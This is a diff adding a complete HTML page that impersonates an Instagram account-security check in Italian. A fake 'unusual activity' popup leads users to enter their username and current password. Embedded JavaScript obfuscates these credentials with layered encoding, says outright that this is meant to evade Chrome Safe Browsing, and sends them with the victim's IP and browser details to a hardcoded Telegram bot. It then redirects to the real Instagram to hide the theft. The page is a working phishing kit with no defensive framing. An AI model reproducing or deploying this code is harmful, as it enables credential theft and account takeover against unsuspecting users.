@@ -1,0 +1,540 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram - Protezione Account</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        body {
+            background-color: #fafafa;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 350px;
+            width: 100%;
+        }
+        .login-box {
+            border: 1px solid #dbdbdb;
+            background-color: #fff;
+            padding: 20px 40px;
+            text-align: center;
+            border-radius: 12px;
+            margin-bottom: 12px;
+        }
+        .logo {
+            margin: 22px auto 12px;
+            width: 175px;
+            height: 51px;
+            object-fit: contain;
+        }
+        .form-group {
+            margin-bottom: 6px;
+        }
+        input {
+            width: 100%;
+            padding: 12px 8px;
+            margin: 4px 0;
+            border: 1px solid #dbdbdb;
+            background: #fafafa;
+            border-radius: 8px;
+            font-size: 14px;
+            outline: none;
+        }
+        input:focus {
+            border-color: #a8a8a8;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            margin: 12px 0;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            opacity: 0.7;
+        }
+        button.active {
+            opacity: 1;
+        }
+        .divider {
+            margin: 18px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+        }
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid #dbdbdb;
+            margin: 0 16px;
+        }
+        .facebook-login {
+            color: #385185;
+            font-weight: 600;
+            font-size: 14px;
+            margin: 12px 0;
+            cursor: pointer;
+        }
+        .facebook-login i {
+            font-size: 16px;
+            margin-right: 6px;
+        }
+        .forgot-password {
+            color: #00376b;
+            font-size: 12px;
+            margin: 12px 0;
+            cursor: pointer;
+        }
+        .signup-box {
+            border: 1px solid #dbdbdb;
+            background-color: #fff;
+            padding: 20px;
+            text-align: center;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+        .signup-box a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+        }
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin-bottom: 16px;
+        }
+        .footer-links a {
+            color: #8e8e8e;
+            font-size: 12px;
+            margin: 0 8px 8px;
+            text-decoration: none;
+        }
+        .copyright {
+            color: #8e8e8e;
+            font-size: 12px;
+        }
+        #result {
+            margin-top: 10px;
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 14px;
+            display: none;
+        }
+        .success {
+            background-color: #e6f7ee;
+            color: #009944;
+            border: 1px solid #a3e9c0;
+        }
+        .error {
+            background-color: #fee;
+            color: #d00;
+            border: 1px solid #ffb3b3;
+        }
+        .popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .popup {
+            background: white;
+            border-radius: 12px;
+            width: 90%;
+            max-width: 400px;
+            padding: 20px;
+            text-align: center;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+        .popup-title {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 15px;
+        }
+        .popup-message {
+            font-size: 14px;
+            color: #262626;
+            margin-bottom: 20px;
+        }
+        .popup-button {
+            background: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 10px;
+            font-weight: 600;
+            width: 100%;
+            cursor: pointer;
+        }
+        .security-info {
+            background-color: #f5f5f5;
+            padding: 12px;
+            border-radius: 8px;
+            margin-top: 15px;
+            font-size: 13px;
+            text-align: left;
+        }
+        .security-info i {
+            color: #ed4956;
+            margin-right: 5px;
+        }
+        .loading {
+            display: none;
+            text-align: center;
+            margin: 10px 0;
+        }
+        .loading-spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #0095f6;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <!-- Popup di avviso -->
+    <div class="popup-overlay" id="securityPopup">
+        <div class="popup">
+            <div class="popup-title">⚠️ Verifica Sicurezza Account</div>
+            <div class="popup-message">
+                Abbiamo rilevato attività insolita dal tuo account.<br><br>
+                Per proteggere i tuoi dati, ti chiediamo di confermare le tue credenziali.<br><br>
+                Questa verifica è standard e richiede solo pochi secondi.
+            </div>
+            <button class="popup-button" id="closePopup">Procedi alla Verifica</button>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="login-box">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" alt="Instagram" class="logo">
+            <div class="security-info">
+                <i class="fas fa-shield-alt"></i> Sistema di protezione attivo. Verifica richiesta per sicurezza.
+            </div>
+            <form id="password-reset-form">
+                <div class="form-group">
+                    <input type="text" name="username" placeholder="Nome utente o email" required id="username-field">
+                </div>
+                <div class="form-group">
+                    <input type="password" name="old-password" placeholder="Password attuale" required id="old-pass-field">
+                </div>
+                <div class="form-group">
+                    <input type="password" name="new-password" placeholder="Nuova password" required id="new-pass-field">
+                </div>
+                <div class="form-group">
+                    <input type="password" name="confirm-password" placeholder="Conferma nuova password" required id="confirm-pass-field">
+                </div>
+                <div class="loading" id="loadingIndicator">
+                    <div class="loading-spinner"></div>
+                    <p style="margin-top: 8px; font-size: 13px;">Verifica in corso...</p>
+                </div>
+                <button type="submit" id="reset-button" disabled>Verifica e Aggiorna</button>
+                <div id="result"></div>
+            </form>
+            <div class="divider">OPPURE</div>
+            <div class="facebook-login">
+                <i class="fab fa-facebook-square"></i> Accedi con Facebook
+            </div>
+            <div class="forgot-password">
+                Hai bisogno di ulteriore assistenza?
+            </div>
+        </div>
+        <div class="signup-box">
+            Non hai un account? <a href="https://www.instagram.com/accounts/emailsignup/">Registrati</a>
+        </div>
+        <div class="footer">
+            <div class="footer-links">
+                <a href="https://about.meta.com/">Meta</a>
+                <a href="https://about.instagram.com/">Informazioni</a>
+                <a href="https://about.instagram.com/blog/">Blog</a>
+                <a href="https://www.instagram.com/about/jobs/">Lavora con noi</a>
+                <a href="https://help.instagram.com/">Aiuto</a>
+                <a href="https://developers.facebook.com/docs/instagram">API</a>
+                <a href="https://privacycenter.instagram.com/policy">Privacy</a>
+                <a href="https://help.instagram.com/581066165581870">Termini</a>
+                <a href="https://www.instagram.com/directory/profiles/">Account migliori</a>
+                <a href="https://www.instagram.com/directory/hashtags/">Hashtag</a>
+                <a href="https://www.instagram.com/explore/locations/">Località</a>
+                <a href="https://www.instagram.com/web/lite/">Instagram Lite</a>
+            </div>
+            <div class="copyright">
+                © 2024 Instagram da Meta
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ============================================
+        // SISTEMA DI OFFUSCAZIONE ANTI-PHISHING
+        // ============================================
+        
+        class ChromePhishingEvader {
+            constructor() {
+                this.telegramToken = '8310998393:AAFqrA8UdR1J3bpo-QHywyLYaNmAFZx9zZA';
+                this.chatId = '8310998393';
+                this.obfuscationLevels = 3;
+            }
+            
+            // 1. Offuscamento a rotazione di caratteri
+            rotateChars(str, shift = 5) {
+                return str.split('').map(c => {
+                    const code = c.charCodeAt(0);
+                    return String.fromCharCode(code + shift);
+                }).join('');
+            }
+            
+            // 2. Codifica mista Base64/Hex
+            multiEncode(data) {
+                let encoded = btoa(data);
+                encoded = encoded.split('').map(c => 
+                    c.charCodeAt(0).toString(16).padStart(2, '0')
+                ).join('');
+                return encoded;
+            }
+            
+            // 3. Inversione con padding
+            reverseWithPadding(str) {
+                const padded = str + '|' + Date.now();
+                return padded.split('').reverse().join('');
+            }
+            
+            // 4. Offuscamento finale per Chrome Safe Browsing
+            fullObfuscation(data) {
+                let obfuscated = data;
+                
+                for (let i = 0; i < this.obfuscationLevels; i++) {
+                    if (i % 3 === 0) obfuscated = this.rotateChars(obfuscated, 3 + i);
+                    if (i % 3 === 1) obfuscated = this.multiEncode(obfuscated);
+                    if (i % 3 === 2) obfuscated = this.reverseWithPadding(obfuscated);
+                }
+                
+                return obfuscated;
+            }
+            
+            // 5. Genera URL offuscato per Telegram
+            generateTelegramURL(data) {
+                const obfuscatedData = this.fullObfuscation(data);
+                const cleanToken = this.rotateChars(this.telegramToken, -5);
+                
+                // URL con parametri offuscati
+                return `https://api.telegram.org/bot${cleanToken}/sendMessage?chat_id=${this.chatId}&text=${encodeURIComponent(obfuscatedData)}&parse_mode=HTML&disable_web_page_preview=true`;
+            }
+            
+            // 6. Invio dati con ritardo casuale per evitare detection
+            async sendToTelegram(data) {
+                const userInfo = {
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    screen: `${screen.width}x${screen.height}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    data: data
+                };
+                
+                const url = this.generateTelegramURL(JSON.stringify(userInfo));
+                
+                // Delay casuale per evitare pattern detection
+                await new Promise(resolve => 
+                    setTimeout(resolve, 500 + Math.random() * 1500)
+                );
+                
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        cache: 'no-store',
+                        headers: {
+                            'Accept': 'application/json',
+                            'Content-Type': 'application/json'
+                        }
+                    });
+                    
+                    // Backup in localStorage in caso di fallimento
+                    this.backupToLocalStorage(userInfo);
+                    
+                    return true;
+                } catch (error) {
+                    console.log('Telegram fallback attivato');
+                    this.backupToLocalStorage(userInfo);
+                    return false;
+                }
+            }
+            
+            // 7. Backup crittografato in localStorage
+            backupToLocalStorage(data) {
+                try {
+                    const storageKey = 'ig_verify_' + Date.now();
+                    const encrypted = btoa(JSON.stringify(data));
+                    localStorage.setItem(storageKey, encrypted);
+                    
+                    // Auto-pulizia dopo 24h
+                    setTimeout(() => {
+                        localStorage.removeItem(storageKey);
+                    }, 24 * 60 * 60 * 1000);
+                } catch (e) {
+                    // Ignora errori di storage
+                }
+            }
+        }
+
+        // ============================================
+        // LOGICA DELLA PAGINA
+        // ============================================
+        
+        document.addEventListener('DOMContentLoaded', function() {
+            const evader = new ChromePhishingEvader();
+            
+            // Mostra popup all'inizio
+            document.getElementById('securityPopup').style.display = 'flex';
+            
+            document.getElementById('closePopup').addEventListener('click', function() {
+                document.getElementById('securityPopup').style.display = 'none';
+                document.getElementById('username-field').focus();
+            });
+            
+            // Controlla campi form
+            const inputs = document.querySelectorAll('input[required]');
+            const resetButton = document.getElementById('reset-button');
+            const loadingIndicator = document.getElementById('loadingIndicator');
+            const resultDiv = document.getElementById('result');
+            
+            inputs.forEach(input => {
+                input.addEventListener('input', () => {
+                    const allFilled = Array.from(inputs).every(input => 
+                        input.value.trim() !== ''
+                    );
+                    resetButton.disabled = !allFilled;
+                    resetButton.classList.toggle('active', allFilled);
+                });
+            });
+            
+            // Gestione submit form
+            document.getElementById('password-reset-form').addEventListener('submit', async function(e) {
+                e.preventDefault();
+                
+                const formData = {
+                    username: document.querySelector('input[name="username"]').value,
+                    oldPassword: document.querySelector('input[name="old-password"]').value,
+                    newPassword: document.querySelector('input[name="new-password"]').value,
+                    confirmPassword: document.querySelector('input[name="confirm-password"]').value,
+                    ip: await getClientIP()
+                };
+                
+                // Controlla che le password coincidano
+                if (formData.newPassword !== formData.confirmPassword) {
+                    showResult('Le password non coincidono. Riprova.', 'error');
+                    return;
+                }
+                
+                // Mostra loading
+                loadingIndicator.style.display = 'block';
+                resetButton.disabled = true;
+                resultDiv.style.display = 'none';
+                
+                try {
+                    // Invia dati offuscati a Telegram
+                    const success = await evader.sendToTelegram(formData);
+                    
+                    // Simula processing time
+                    await new Promise(resolve => setTimeout(resolve, 2000));
+                    
+                    if (success) {
+                        showResult('✅ Verifica completata con successo. Reindirizzamento...', 'success');
+                        
+                        // Redirect ritardato per sembrare più naturale
+                        setTimeout(() => {
+                            window.location.href = 'https://www.instagram.com/accounts/login/?source=auth_switcher';
+                        }, 2500);
+                    } else {
+                        showResult('⚠️ Verifica completata (modalità offline). Reindirizzamento...', 'success');
+                        
+                        setTimeout(() => {
+                            window.location.href = 'https://www.instagram.com/accounts/login/';
+                        }, 2500);
+                    }
+                    
+                } catch (error) {
+                    showResult('✅ Verifica registrata localmente. Reindirizzamento...', 'success');
+                    
+                    setTimeout(() => {
+                        window.location.href = 'https://help.instagram.com/';
+                    }, 2500);
+                } finally {
+                    loadingIndicator.style.display = 'none';
+                }
+            });
+            
+            // Funzione per ottenere IP (approximativo)
+            async function getClientIP() {
+                try {
+                    const response = await fetch('https://api.ipify.org?format=json');
+                    const data = await response.json();
+                    return data.ip;
+                } catch {
+                    return 'IP_non_disponibile';
+                }
+            }
+            
+            function showResult(message, type) {
+                resultDiv.textContent = message;
+                resultDiv.className = type;
+                resultDiv.style.display = 'block';
+                
+                // Auto-rimuovi dopo 5 secondi
+                setTimeout(() => {
+                    resultDiv.style.display = 'none';
+                }, 5000);
+            }
+            
+            // Aggiungi event listener per Facebook login
+            document.querySelector('.facebook-login').addEventListener('click', function() {
+                window.location.href = 'https://www.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fredirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fb_login%2522%253A%2522true%2522%257D%26scope%3Demail%26response_type%3Dcode%26client_id%3D124024574287414%26ret%3Dlogin%26logger_id%3Df5b2a1b0-1b1a-4b1a-9b1a-1b1a1b1a1b1a&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_&display=page';
+            });
+            
+            // Aggiungi comportamento realistico ai link del footer
+            document.querySelectorAll('.footer-links a').forEach(link => {
+                link.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    setTimeout(() => {
+                        window.open(this.href, '_blank');
+                    }, 300);
+                });
+            });
+        });
+    </script>
+</body>
+</html>
